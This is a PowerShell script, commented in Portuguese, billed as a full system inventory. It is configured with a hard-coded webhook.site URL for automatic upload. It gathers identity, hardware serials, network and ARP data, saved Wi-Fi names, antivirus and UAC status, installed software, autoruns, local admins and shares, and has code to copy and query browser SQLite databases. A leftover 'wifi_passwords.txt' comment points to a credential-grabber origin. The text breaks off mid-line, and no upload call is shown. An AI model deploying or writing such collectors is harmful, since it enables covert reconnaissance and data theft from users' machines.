
# Deixe vazio ('') se não quiser enviar automaticamente para webhook
$WebhookUrl = 'https://webhook.site/77d0d5d4-f7e9-43ac-810c-0bf2139be510'

# Pasta de exportação (padrão: %TEMP%\p)
$ExportDirDefault = Join-Path $env:TEMP 'p'
# Nome do arquivo de saída (padrão: %TEMP%\wifi_passwords.txt)
$OutputFileDefault = Join-Path $env:TEMP 'system_info.txt'

function Get-SystemInfo {
    [CmdletBinding()]
    param(
        [string]$OutputFile,
        [string]$ExportDir,
        [ValidateRange(1,5000)]
        [int]$RecentFiles = 100,
        [ValidateRange(1,5000)]
        [int]$BrowserEntries = 100
    )

    if([string]::IsNullOrWhiteSpace($ExportDir)) {
        $ExportDir = Join-Path $env:TEMP 'SystemInfo'
    }
    if([string]::IsNullOrWhiteSpace($OutputFile)) {
        $OutputFile = Join-Path $ExportDir 'system_info.txt'
    }
    $ExportDir = [string]$ExportDir
    $OutputFile = [string]$OutputFile

    if([string]::IsNullOrWhiteSpace($OutputFile)) {
        throw 'OutputFile não pode ser vazio.'
    }

    if([string]::IsNullOrWhiteSpace($ExportDir)) {
        throw 'ExportDir não pode ser vazio.'
    }

    # Não usa SilentlyContinue globalmente: falhas individuais são tratadas pelo helper $try.
    $oldErrorActionPreference = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'

    $sb = New-Object System.Text.StringBuilder
    $sep = '=' * 78
    $add = { param($x) [void]$sb.AppendLine([string]$x) }
    $sec = { param($x) & $add ''; & $add $x; & $add ('-' * 78) }
    $try = {
        param([scriptblock]$Block)
        try { & $Block } catch { $null }
    }
    $fmt = { param($Name,$Value) & $add ('{0,-21}: {1}' -f $Name,$Value) }
    $safeRound = {
        param($Value,$Digits=1)
        if($null -eq $Value -or $Value -eq '') { return '-' }
        try { return [math]::Round([double]$Value,$Digits) } catch { return '-' }
    }

    # -------------------------------------------------------------------------
    # LOG DE EXECUÇÃO
    # -------------------------------------------------------------------------
    # O log é gravado em arquivo separado e também exibido no console.
    # Falhas no próprio logger nunca interrompem a coleta.
    if(-not (Test-Path $ExportDir -PathType Container)) {
        try {
            New-Item -Path $ExportDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
        } catch {}
    }

    $logFile = Join-Path $ExportDir 'system_info.log'
    $log = {
        param(
            [string]$Level,
            [string]$Message
        )

        $line = '[{0}] [{1}] {2}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level.ToUpper(), $Message

        try { Write-Host $line } catch {}

        try {
            Add-Content -Path $logFile -Value $line -Encoding UTF8 -ErrorAction SilentlyContinue
        } catch {}
    }

    $sectionStart = {
        param([string]$Name)
        & $log 'INFO' "Iniciando: $Name"
    }

    $sectionEnd = {
        param([string]$Name,[int]$ElapsedSeconds)
        & $log 'INFO' ("Concluído: {0} ({1}s)" -f $Name,$ElapsedSeconds)
    }

    $cleanText = {
        param([object]$Value,[int]$MaxLength=500)

        if($null -eq $Value) { return '' }

        $s = [string]$Value
        $s = $s -replace "`r",' ' -replace "`n",' ' -replace '\s+',' '
        $s = $s.Trim()

        if($s.Length -gt $MaxLength) {
            return $s.Substring(0,$MaxLength) + '...'
        }

        return $s
    }

    & $log 'INFO' "Início da coleta. PowerShell=$($PSVersionTable.PSVersion). Host=$env:COMPUTERNAME"

    if($PSVersionTable.PSVersion.Major -lt 3) {
        & $log 'WARN' 'PowerShell anterior à versão 3 detectado. Algumas APIs modernas poderão não estar disponíveis; a coleta tentará continuar.'
    }
    & $log 'INFO' "Relatório: $OutputFile"
    & $log 'INFO' "Log: $logFile"

    # -------------------------------------------------------------------------
    # Helper para compatibilidade com versões antigas do PowerShell.
    # Evita depender de -File e -Directory do Get-ChildItem.
    # -------------------------------------------------------------------------
    $getFiles = {
        param([string]$Path,[switch]$Recurse)

        if($Recurse) {
            Get-ChildItem -Path $Path -Force -ErrorAction SilentlyContinue |
                Where-Object { -not $_.PSIsContainer }
        } else {
            Get-ChildItem -Path $Path -Force -ErrorAction SilentlyContinue |
                Where-Object { -not $_.PSIsContainer }
        }
    }

    $getDirectories = {
        param([string]$Path)

        Get-ChildItem -Path $Path -Force -ErrorAction SilentlyContinue |
            Where-Object { $_.PSIsContainer }
    }

    # -------------------------------------------------------------------------
    # SQLite PARA NAVEGADORES
    # -------------------------------------------------------------------------
    # Estratégia:
    #   1. System.Data.SQLite
    #   2. Microsoft.Data.Sqlite
    #   3. sqlite3.exe, se instalado
    #
    # O banco original nunca é alterado. É copiado para %TEMP% antes da leitura.
    # A saída SQL é convertida em objetos PowerShell e depois em texto legível.
    # -------------------------------------------------------------------------
    $sqliteProvider = $null
    $sqliteType = $null
    $sqliteExe = $null

    try {
        Add-Type -AssemblyName System.Data.SQLite -ErrorAction Stop
        $sqliteType = [System.Data.SQLite.SQLiteConnection]
        $sqliteProvider = 'System.Data.SQLite'
        & $log 'INFO' 'SQLite: System.Data.SQLite disponível.'
    } catch {}

    if(-not $sqliteType) {
        try {
            Add-Type -AssemblyName Microsoft.Data.Sqlite -ErrorAction Stop
            $sqliteType = [Microsoft.Data.Sqlite.SqliteConnection]
            $sqliteProvider = 'Microsoft.Data.Sqlite'
            & $log 'INFO' 'SQLite: Microsoft.Data.Sqlite disponível.'
        } catch {}
    }

    try {
        $sqliteCommand = Get-Command sqlite3.exe -ErrorAction SilentlyContinue
        if($sqliteCommand) {
            $sqliteExe = $sqliteCommand.Source
            if([string]::IsNullOrWhiteSpace($sqliteExe)) {
                $sqliteExe = $sqliteCommand.Definition
            }
            & $log 'INFO' "SQLite CLI disponível: $sqliteExe"
        }
    } catch {}

    if(-not $sqliteProvider -and -not $sqliteExe) {
        & $log 'WARN' 'Nenhum mecanismo SQLite encontrado. Histórico SQL dos navegadores não poderá ser convertido.'
    }

    $invokeBrowserSQLite = {
        param(
            [string]$Database,
            [string]$Query,
            [string]$Context = 'SQLite'
        )

        if([string]::IsNullOrWhiteSpace($Database) -or -not (Test-Path $Database -PathType Leaf)) {
            & $log 'WARN' ("{0}: banco não encontrado: {1}" -f $Context,$Database)
            return $null
        }

        if([string]::IsNullOrWhiteSpace($Query)) {
            & $log 'WARN' ("{0}: consulta SQL vazia." -f $Context)
            return $null
        }

        $tmpDir = Join-Path $env:TEMP ('sysinfo_sqlite_{0}' -f ([guid]::NewGuid().ToString('N')))
        $tmp = Join-Path $tmpDir ([System.IO.Path]::GetFileName($Database))
        $cn = $null
        $cmd = $null
        $rd = $null

        $cleanupSqliteTemp = {
            if($tmpDir -and (Test-Path $tmpDir -PathType Container)) {
                Remove-Item -Path $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
            }
        }

        try {
            & $log 'INFO' ("{0}: copiando banco e arquivos WAL/SHM para área temporária." -f $Context)

            New-Item -Path $tmpDir -ItemType Directory -Force -ErrorAction Stop | Out-Null

            $copySucceeded = $false
            $copyLastError = $null

            for($copyAttempt = 1; $copyAttempt -le 3 -and -not $copySucceeded; $copyAttempt++) {
                try {
                    Copy-Item -Path $Database -Destination $tmp -Force -ErrorAction Stop
                    $copySucceeded = $true
                }
                catch {
                    $copyLastError = $_.Exception.Message
                    if($copyAttempt -lt 3) {
                        Start-Sleep -Milliseconds 250
                    }
                }
            }

            if(-not $copySucceeded) {
                throw "Não foi possível copiar o banco SQLite após 3 tentativas: $copyLastError"
            }

            # Em bancos SQLite no modo WAL, registros recentes podem estar nos
            # arquivos -wal e -shm. Mantemos os sidecars junto da cópia.
            foreach($sidecar in @('-wal','-shm')) {
                $sourceSidecar = $Database + $sidecar
                $destSidecar = $tmp + $sidecar

                if(Test-Path $sourceSidecar -PathType Leaf) {
                    try {
                        Copy-Item -Path $sourceSidecar -Destination $destSidecar -Force -ErrorAction Stop
                    }
                    catch {
                        & $log 'WARN' ("{0}: não foi possível copiar {1}." -f $Context,$sidecar)
                    }
                }
            }

            if($sqliteProvider -eq 'System.Data.SQLite') {
                $cn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp;Version=3;Read Only=True;")
                $cn.Open()
                $cmd = $cn.CreateCommand()
                $cmd.CommandText = $Query
                $rd = $cmd.ExecuteReader()

                $table = New-Object System.Data.DataTable
                $table.Load($rd)

                & $log 'INFO' ("{0}: consulta concluída via System.Data.SQLite. Registros={1}" -f $Context,$table.Rows.Count)
                & $cleanupSqliteTemp
                return $table
            }

            if($sqliteProvider -eq 'Microsoft.Data.Sqlite') {
                $cn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tmp;Mode=ReadOnly")
                $cn.Open()
                $cmd = $cn.CreateCommand()
                $cmd.CommandText = $Query
                $rd = $cmd.ExecuteReader()

                $rows = New-Object System.Collections.ArrayList

                while($rd.Read()) {
                    $obj = [ordered]@{}

                    for($i = 0; $i -lt $rd.FieldCount; $i++) {
                        $value = $rd.GetValue($i)

                        if($value -is [DBNull]) {
                            $value = $null
                        }

                        $obj[$rd.GetName($i)] = $value
                    }

                    [void]$rows.Add([pscustomobject]$obj)
                }

                & $log 'INFO' ("{0}: consulta concluída via Microsoft.Data.Sqlite. Registros={1}" -f $Context,$rows.Count)
                & $cleanupSqliteTemp
                return @($rows)
            }
        }
        catch {
            & $log 'WARN' ("{0}: provider .NET falhou: {1}" -f $Context,$_.Exception.Message)
        }
        finally {
            if($rd) { try { $rd.Dispose() } catch {} }
            if($cmd) { try { $cmd.Dispose() } catch {} }
            if($cn) {
                try { $cn.Close() } catch {}
                try { $cn.Dispose() } catch {}
            }
        }

        # Fallback: sqlite3.exe
        if($sqliteExe) {
            $process = $null
            try {
                & $log 'INFO' ("{0}: tentando sqlite3.exe como fallback." -f $Context)

                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = $sqliteExe
                $psi.Arguments = '"' + $tmp.Replace('"','""') + '"'
                $psi.UseShellExecute = $false
                $psi.CreateNoWindow = $true
                $psi.RedirectStandardInput = $true
                $psi.RedirectStandardOutput = $true
                $psi.RedirectStandardError = $true

                $process = New-Object System.Diagnostics.Process
                $process.StartInfo = $psi

                if(-not $process.Start()) {
                    throw 'Não foi possível iniciar sqlite3.exe.'
                }

                # CSV com cabeçalho facilita a conversão SQL -> objetos PowerShell.
                $sqlInput = ".headers on`r`n.mode csv`r`n$Query`r`n.quit`r`n"
                $process.StandardInput.Write($sqlInput)
                $process.StandardInput.Close()

                $stdout = $process.StandardOutput.ReadToEnd()
                $stderr = $process.StandardError.ReadToEnd()
                $process.WaitForExit()

                if($process.ExitCode -ne 0) {
                    throw "sqlite3.exe retornou código $($process.ExitCode): $stderr"
                }

                if([string]::IsNullOrWhiteSpace($stdout)) {
                    & $log 'INFO' ("{0}: consulta sqlite3.exe não retornou registros." -f $Context)
                    & $cleanupSqliteTemp
                    return $null
                }

                $rows = @($stdout | ConvertFrom-Csv)

                & $log 'INFO' ("{0}: consulta concluída via sqlite3.exe. Registros={1}" -f $Context,$rows.Count)
                & $cleanupSqliteTemp
                return $rows
            }
            catch {
                & $log 'WARN' ("{0}: sqlite3.exe falhou: {1}" -f $Context,$_.Exception.Message)
            }
            finally {
                if($process) {
                    try { $process.Dispose() } catch {}
                }
            }
        }

        & $cleanupSqliteTemp
        return $null
    }

    $writeSqlRows = {
        param(
            [object]$Rows,
            [string]$SectionName,
            [string[]]$Columns
        )

        & $add ''
        & $add $SectionName
        & $add ('-' * 60)

        if($null -eq $Rows) {
            & $add '  [nenhum resultado]'
            return 0
        }

        $array = @($Rows)

        if($array.Count -eq 0) {
            & $add '  [nenhum resultado]'
            return 0
        }

        foreach($row in $array) {
            $parts = New-Object System.Collections.ArrayList

            foreach($column in $Columns) {
                $value = $null

                try {
                    $property = $row.PSObject.Properties[$column]
                    if($property) {
                        $value = $property.Value
                    }
                } catch {}

                $value = & $cleanText $value 1000
                [void]$parts.Add(('{0}: {1}' -f $column,$value))
            }

            & $add ('  - ' + ($parts -join ' | '))
        }

        return $array.Count
    }

    $scriptStart = Get-Date

    try {
        & $add $sep
        & $add 'INVENTÁRIO TÉCNICO COMPLETO DO SISTEMA'
        & $add "Coletado em: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        & $add $sep

        # =====================================================================
        # 01. IDENTIFICAÇÃO
        # =====================================================================
        $sectionTimer = Get-Date
        & $sectionStart '01. Identificação'
        & $sec '## 01. IDENTIFICAÇÃO'
        @(
            "Usuário              : $env:USERNAME"
            "Domínio              : $env:USERDOMAIN"
            "Domínio DNS          : $env:USERDNSDOMAIN"
            "Perfil               : $env:USERPROFILE"
            "Computador           : $env:COMPUTERNAME"
            "Processador PS       : $env:PROCESSOR_IDENTIFIER"
            "Arquitetura PS       : $env:PROCESSOR_ARCHITECTURE"
        ) | ForEach-Object { & $add $_ }

        & $log 'INFO' 'Consultando identificação do computador.'
        $cs = & $try { Get-CimInstance Win32_ComputerSystem -ErrorAction Stop }
        $os = & $try { Get-CimInstance Win32_OperatingSystem -ErrorAction Stop }
        $reg = & $try { Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -ErrorAction Stop }

        if($cs) {
            & $fmt 'Fabricante' $cs.Manufacturer
            & $fmt 'Modelo' $cs.Model
            $cp = & $try { Get-CimInstance Win32_ComputerSystemProduct -ErrorAction Stop }
            if($cp) { & $fmt 'UUID' $cp.UUID }
            & $fmt 'Domínio/Workgroup' $(if($cs.PartOfDomain){ "Domínio: $($cs.Domain)" } else { "Workgroup: $($cs.Workgroup)" })
        }

        # =====================================================================
        # 02. SISTEMA OPERACIONAL
        # =====================================================================
        $sectionTimer = Get-Date
        & $sectionStart '02. Sistema operacional'
        & $sec '## 02. SISTEMA OPERACIONAL / WINDOWS'
        if($os) {
            $build = if($reg.CurrentBuild) { "$($reg.CurrentBuild).$($reg.UBR)" } else { $os.BuildNumber }
            $uptime = '-'
            if($os.LastBootUpTime) {
                $uptime = (& $safeRound (((Get-Date) - $os.LastBootUpTime).TotalDays),1)
            }
            @(
                "Produto              : $($reg.ProductName)"
                "Display Version       : $($reg.DisplayVersion)"
                "Release ID            : $($reg.ReleaseId)"
                "Build                 : $build"
                "Versão WMI            : $($os.Version)"
                "Arquitetura           : $($os.OSArchitecture)"
                "Idioma                : $($os.MUILanguages -join ', ')"
                "Instalação            : $($os.InstallDate)"
                "Último Boot           : $($os.LastBootUpTime)"
                "Uptime (dias)         : $uptime"
                "Windows Directory     : $($os.WindowsDirectory)"
                "System Directory      : $($os.SystemDirectory)"
                "Product Type          : $($os.ProductType)"
                "Usuário registrado    : $($os.RegisteredUser)"
            ) | ForEach-Object { & $add $_ }
        }

        $lic = & $try { Get-CimInstance SoftwareLicensingProduct -ErrorAction Stop | Where-Object { $_.PartialProductKey -and $_.LicenseStatus -eq 1 } | Select-Object -First 1 }
        if($lic) { & $fmt 'Ativação Windows' 'Licenciado/Ativado' }

        # =====================================================================
        # 03. HARDWARE
        # =====================================================================
        $sectionTimer = Get-Date
        & $sectionStart '03. Hardware'
        & $sec '## 03. HARDWARE'
        & $log 'INFO' 'Consultando BIOS e número de série.'
        $bios = & $try { Get-CimInstance Win32_BIOS -ErrorAction Stop }
        if($bios) {
            @(
                "BIOS                 : $($bios.Name)"
                "BIOS Fabricante      : $($bios.Manufacturer)"
                "BIOS Versão          : $($bios.SMBIOSBIOSVersion)"
                "BIOS Data            : $($bios.ReleaseDate)"
                "Serial               : $($bios.SerialNumber)"
            ) | ForEach-Object { & $add $_ }
        }

        $cpu = & $try { Get-CimInstance Win32_Processor -ErrorAction Stop | Select-Object -First 1 }
        if($cpu) {
            @(
                "CPU                  : $($cpu.Name)"
                "Cores                : $($cpu.NumberOfCores)"
                "Threads              : $($cpu.NumberOfLogicalProcessors)"
                "Clock Máx.           : $($cpu.MaxClockSpeed) MHz"
                "Clock Atual          : $($cpu.CurrentClockSpeed) MHz"
                "Cache L2             : $(& $safeRound ($cpu.L2CacheSize/1KB),0) KB"
                "Cache L3             : $(& $safeRound ($cpu.L3CacheSize/1KB),0) KB"
            ) | ForEach-Object { & $add $_ }
        }

        $ram = & $try { Get-CimInstance Win32_PhysicalMemory -ErrorAction Stop }
        if($ram) {
            & $add ''; & $add 'MEMÓRIA RAM:'
            $ram | ForEach-Object {
                & $add "  - $(& $safeRound ($_.Capacity/1GB),1) GB | $($_.Speed) MHz | $($_.Manufacturer) | $($_.PartNumber) | Slot: $($_.DeviceLocator)"
            }
        }

        $disks = & $try { Get-CimInstance Win32_DiskDrive -ErrorAction Stop }
        if($disks) {
            & $add ''; & $add 'DISCOS FÍSICOS:'
            $disks | ForEach-Object {
                & $add "  - $($_.Model) | $(& $safeRound ($_.Size/1GB),0) GB | Interface: $($_.InterfaceType) | Serial: $($_.SerialNumber) | Firmware: $($_.FirmwareRevision)"
            }
        }

        $parts = & $try { Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' -ErrorAction Stop }
        if($parts) {
            & $add ''; & $add 'VOLUMES:'
            $parts | ForEach-Object {
                $used = if($_.Size){ $_.Size - $_.FreeSpace } else { 0 }
                $freePct = if($_.Size){ & $safeRound (($_.FreeSpace/$_.Size)*100),1 } else { '-' }
                & $add "  - $($_.DeviceID) | FS: $($_.FileSystem) | Total: $(& $safeRound ($_.Size/1GB),2) GB | Usado: $(& $safeRound ($used/1GB),2) GB | Livre: $freePct%"
            }
        }

        $smart = & $try { Get-PhysicalDisk -ErrorAction Stop }
        if($smart) {
            & $add ''; & $add 'SAÚDE DOS DISCOS:'
            $smart | ForEach-Object {
                & $add "  - $($_.FriendlyName) | Tipo: $($_.MediaType) | Health: $($_.HealthStatus) | Operacional: $($_.OperationalStatus) | Tamanho: $(& $safeRound ($_.Size/1GB),0) GB"
            }
        }

        $gpus = & $try { Get-CimInstance Win32_VideoController -ErrorAction Stop }
        if($gpus) {
            & $add ''; & $add 'GPU / VÍDEO:'
            $gpus | ForEach-Object {
                & $add "  - $($_.Name) | Driver: $($_.DriverVersion) | Data: $($_.DriverDate) | VRAM: $(& $safeRound ($_.AdapterRAM/1GB),1) GB | Res: $($_.CurrentHorizontalResolution)x$($_.CurrentVerticalResolution)"
            }
        }

        $mon = & $try { Get-CimInstance Win32_DesktopMonitor -ErrorAction Stop }
        if($mon) {
            & $add ''; & $add 'MONITORES:'
            $mon | ForEach-Object { & $add "  - $($_.Name) | PNP: $($_.PNPDeviceID)" }
        }

        $devBad = & $try { Get-CimInstance Win32_PnPEntity -ErrorAction Stop | Where-Object { $_.ConfigManagerErrorCode -and $_.ConfigManagerErrorCode -ne 0 } }
        if($devBad) {
            & $add ''; & $add 'DISPOSITIVOS COM ERRO:'
            $devBad | ForEach-Object { & $add "  - $($_.Name) | Código: $($_.ConfigManagerErrorCode) | PNP: $($_.PNPDeviceID)" }
        }

        $bat = & $try { Get-CimInstance Win32_Battery -ErrorAction Stop }
        if($bat) {
            & $add ''; & $add 'BATERIA:'
            $bat | ForEach-Object {
                & $add "  - $($_.Name) | Status: $($_.BatteryStatus) | Design: $(& $safeRound ($_.DesignCapacity/1000),0) mWh | Atual: $(& $safeRound ($_.CurrentCapacity/1000),0) mWh"
            }
        }

        # =====================================================================
        # 04. REDE - somente informações locais
        # =====================================================================
        $sectionTimer = Get-Date
        & $sectionStart '04. Rede'
        & $sec '## 04. REDE'
        & $log 'INFO' 'Consultando adaptadores e configuração de rede local.'
        $adapters = & $try { Get-NetAdapter -ErrorAction Stop }
        if($adapters) {
            & $add 'ADAPTADORES:'
            $adapters | ForEach-Object { & $add "  - $($_.Name) | $($_.InterfaceDescription) | Status: $($_.Status) | MAC: $($_.MacAddress) | Link: $($_.LinkSpeed)" }
        }

        $cfgs = & $try { Get-NetIPConfiguration -ErrorAction Stop }
        if($cfgs) {
            & $add ''; & $add 'CONFIGURAÇÕES IP:'
            $cfgs | ForEach-Object {
                $ip = if($_.IPv4Address){ $_.IPv4Address.IPAddress -join ', ' } else { '-' }
                $gw = if($_.IPv4DefaultGateway){ $_.IPv4DefaultGateway.NextHop -join ', ' } else { '-' }
                $dns = if($_.DnsServer){ $_.DnsServer.ServerAddresses -join ', ' } else { '-' }
                & $add "  - $($_.InterfaceAlias) | IPv4: $ip | GW: $gw | DNS: $dns | DHCP: $($_.IPv4DHCPEnabled)"
            }
        }

        $prof = & $try { Get-NetConnectionProfile -ErrorAction Stop }
        if($prof) {
            & $add ''; & $add 'PERFIL DE REDE:'
            $prof | ForEach-Object { & $add "  - $($_.InterfaceAlias) | Rede: $($_.Name) | Categoria: $($_.NetworkCategory) | IPv4: $($_.IPv4Connectivity) | IPv6: $($_.IPv6Connectivity)" }
        }

        $proxy = & $try { Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -ErrorAction Stop }
        if($proxy) { & $fmt 'Proxy' $(if($proxy.ProxyEnable){ "Ativo - $($proxy.ProxyServer)" } else { 'Desativado' }) }

        $route = & $try { Get-NetRoute -AddressFamily IPv4 -ErrorAction Stop | Where-Object { $_.NextHop -notin '0.0.0.0','255.255.255.255' } | Select-Object -First 30 }
        if($route) {
            & $add ''; & $add 'ROTAS:'
            $route | ForEach-Object { & $add "  - $($_.DestinationPrefix) | Gateway: $($_.NextHop) | Métrica: $($_.RouteMetric) | Interface: $($_.InterfaceAlias)" }
        }

        $arp = & $try { Get-NetNeighbor -ErrorAction Stop | Where-Object State -ne Unreachable | Select-Object -First 50 }
        if($arp) {
            & $add ''; & $add 'ARP:'
            $arp | ForEach-Object { & $add "  - $($_.IPAddress) | $($_.MacAddress) | $($_.State) | $($_.InterfaceAlias)" }
        }

        $wifi = & $try { netsh wlan show interfaces 2>$null }
        if($wifi) {
            & $add ''; & $add 'WI-FI ATUAL:'
            $wifi | Select-String '^(\s*)(SSID|BSSID|Radio type|Channel|Receive rate|Transmit rate|Signal|State)\s*:' | ForEach-Object { & $add "  - $($_.Line.Trim())" }
        }

        $profiles = & $try { netsh wlan show profiles 2>$null | Select-String '^\s*All User Profile\s*:\s*(.+)' | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() } }
        if($profiles) {
            & $add ''; & $add 'PERFIS WI-FI SALVOS (somente SSID):'
            $profiles | ForEach-Object { & $add "  - $_" }
        }

        # =====================================================================
        # 05. SEGURANÇA
        # =====================================================================
        $sectionTimer = Get-Date
        & $sectionStart '05. Segurança'
        & $sec '## 05. SEGURANÇA'
        & $log 'INFO' 'Consultando firewall, TPM, Secure Boot, BitLocker e antivírus.'
        $fw = & $try { Get-NetFirewallProfile -ErrorAction Stop }
        if($fw) { & $add "Firewall             : $(($fw | ForEach-Object { "$($_.Name): $(if($_.Enabled){'ON'}else{'OFF'})" }) -join ', ')" }

        $tpm = & $try { Get-Tpm -ErrorAction Stop }
        if($tpm) { @("TPM presente         : $($tpm.TpmPresent)","TPM pronto            : $($tpm.TpmReady)","TPM versão            : $($tpm.ManufacturerVersion)") | ForEach-Object { & $add $_ } }

        $sbv = & $try { Confirm-SecureBootUEFI -ErrorAction Stop }
        if($null -ne $sbv) { & $fmt 'Secure Boot' $(if($sbv){'Ativado'}else{'Desativado'}) }

        $bit = & $try { Get-BitLockerVolume -ErrorAction Stop }
        if($bit) { & $add 'BITLOCKER:'; $bit | ForEach-Object { & $add "  - $($_.MountPoint) | Status: $($_.VolumeStatus) | Proteção: $($_.ProtectionStatus) | Método: $($_.EncryptionMethod)" } }

        $av = & $try { Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntivirusProduct -ErrorAction Stop }
        if($av) { & $add ''; & $add 'ANTIVÍRUS:'; $av | ForEach-Object { & $add "  - $($_.DisplayName) | Status: $($_.productState)" } }

        $def = & $try { Get-MpComputerStatus -ErrorAction Stop }
        if($def) { @("Defender             : Ativo=$($def.AntivirusEnabled) | RT=$($def.RealTimeProtectionEnabled)","Assinatura Defender   : $($def.AntivirusSignatureLastUpdated)") | ForEach-Object { & $add $_ } }

        $uac = & $try { Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -ErrorAction Stop }
        if($uac) { & $fmt 'UAC' $(if($uac.EnableLUA){'Ativado'}else{'Desativado'}) }

        # =====================================================================
        # 06. WINDOWS UPDATE
        # =====================================================================
        $sectionTimer = Get-Date
        & $sectionStart '06. Windows Update'
        & $sec '## 06. WINDOWS UPDATE / PATCHES'
        # InstalledOn pode chegar como string inválida em alguns sistemas.
        # Não usamos Sort-Object diretamente sobre InstalledOn porque isso pode
        # provocar conversão automática para DateTime e interromper a coleta.
        & $log 'INFO' 'Consultando hotfixes e atualizações instaladas.'
        $hot = & $try {
            $hotfixes = @(Get-HotFix -ErrorAction Stop)

            $hotfixes | Sort-Object -Property @{
                Expression = {
                    $date = $null

                    if($_.InstalledOn -is [datetime]) {
                        $date = $_.InstalledOn
                    }
                    elseif($null -ne $_.InstalledOn -and [string]$_.InstalledOn -ne '') {
                        try {
                            $date = [datetime]::Parse(
                                [string]$_.InstalledOn,
                                [System.Globalization.CultureInfo]::CurrentCulture
                            )
                        }
                        catch {
                            try {
                                $date = [datetime]::Parse(
                                    [string]$_.InstalledOn,
                                    [System.Globalization.CultureInfo]::InvariantCulture
                                )
                            }
                            catch {}
                        }
                    }

                    if($null -eq $date) {
                        [datetime]::MinValue
                    }
                    else {
                        $date
                    }
                }
                Descending = $true
            }
        }

        if($hot) {
            $hot | Select-Object -First 20 | ForEach-Object {
                $installed = if($null -ne $_.InstalledOn -and [string]$_.InstalledOn -ne '') {
                    [string]$_.InstalledOn
                }
                else {
                    '[data inválida/indisponível]'
                }

                & $add "  - $($_.HotFixID) | $installed | $($_.Description)"
            }
        }

        $wu = & $try {
            $session = New-Object -ComObject Microsoft.Update.Session
            $searcher = $session.CreateUpdateSearcher()
            $result = $searcher.Search('IsInstalled=0')
            [pscustomobject]@{
                Last = $searcher.LastSearchSuccessDate
                Pending = $result.Updates
            }
        }
        if($wu) {
            @("Última busca         : $($wu.Last)","Pendentes             : $($wu.Pending.Count)") | ForEach-Object { & $add $_ }
            $wu.Pending | Select-Object -First 10 | ForEach-Object { & $add "  - $($_.Title)" }
        }

        # =====================================================================
        # 07. SOFTWARE / DRIVERS
        # =====================================================================
        & $sec '## 07. SOFTWARE / DRIVERS'
        $apps = & $try {
            Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction Stop |
                Where-Object DisplayName |
                Select-Object DisplayName,DisplayVersion,Publisher,InstallDate |
                Sort-Object DisplayName
        }
        if($apps) { $apps | Select-Object -First 100 | ForEach-Object { & $add "  - $($_.DisplayName) v$($_.DisplayVersion) | $($_.Publisher) | $($_.InstallDate)" } }

        $drivers = & $try {
            Get-CimInstance Win32_PnPSignedDriver -ErrorAction Stop |
                Where-Object DeviceName |
                Select-Object DeviceName,DriverVersion,DriverDate,Manufacturer |
                Sort-Object DeviceName
        }
        if($drivers) { & $add ''; & $add 'DRIVERS:'; $drivers | Select-Object -First 100 | ForEach-Object { & $add "  - $($_.DeviceName) | $($_.DriverVersion) | $($_.DriverDate) | $($_.Manufacturer)" } }

        # =====================================================================
        # 08. SERVIÇOS / INICIALIZAÇÃO
        # =====================================================================
        & $sec '## 08. SERVIÇOS / INICIALIZAÇÃO'
        $svc = & $try { Get-Service -ErrorAction Stop | Where-Object Status -eq Running | Sort-Object Name }
        if($svc) { $svc | Select-Object -First 100 | ForEach-Object { & $add "  - $($_.Name) | $($_.DisplayName) | $($_.StartType)" } }

        $run = @(
            'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
            'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
        )
        & $add 'INICIALIZAÇÃO (Run):'
        foreach($p in $run) {
            $x = & $try { Get-ItemProperty $p -ErrorAction Stop }
            if($x) {
                $x.PSObject.Properties | Where-Object Name -notmatch '^PS' | ForEach-Object { & $add "  - $($_.Name): $($_.Value)" }
            }
        }

        $startup = @("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup","$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")
        & $add 'PASTAS STARTUP:'
        foreach($p in $startup) {
            & $try { Get-ChildItem $p -Force -ErrorAction Stop | Where-Object { -not $_.PSIsContainer } | ForEach-Object { & $add "  - $($_.FullName)" } }
        }

        $tasks = & $try { Get-ScheduledTask -ErrorAction Stop | Where-Object { $_.State -ne 'Disabled' -and $_.TaskPath -notlike '\Microsoft\*' } | Select-Object TaskName,TaskPath,State }
        if($tasks) { & $add ''; & $add 'TAREFAS AGENDADAS (TERCEIROS):'; $tasks | Select-Object -First 100 | ForEach-Object { & $add "  - $($_.TaskPath)$($_.TaskName) | $($_.State)" } }

        # =====================================================================
        # 09. USUÁRIOS / COMPARTILHAMENTOS
        # =====================================================================
        & $sec '## 09. USUÁRIOS / COMPARTILHAMENTOS'
        $users = & $try { Get-LocalUser -ErrorAction Stop }
        if($users) { $users | ForEach-Object { & $add "  - $($_.Name) | Ativo: $($_.Enabled) | Último Login: $($_.LastLogon) | Senha: $($_.PasswordLastSet)" } }

        $admins = & $try { Get-LocalGroupMember Administrators -ErrorAction Stop }
        if($admins) { & $add ''; & $add 'ADMINISTRADORES:'; $admins | ForEach-Object { & $add "  - $($_.Name) | $($_.ObjectType)" } }

        $shares = & $try { Get-SmbShare -ErrorAction Stop }
        if($shares) { & $add ''; & $add 'COMPARTILHAMENTOS SMB:'; $shares | ForEach-Object { & $add "  - $($_.Name) | $($_.Path) | $($_.ShareType)" } }

        $mapped = & $try { Get-PSDrive -PSProvider FileSystem -ErrorAction Stop | Where-Object DisplayRoot }
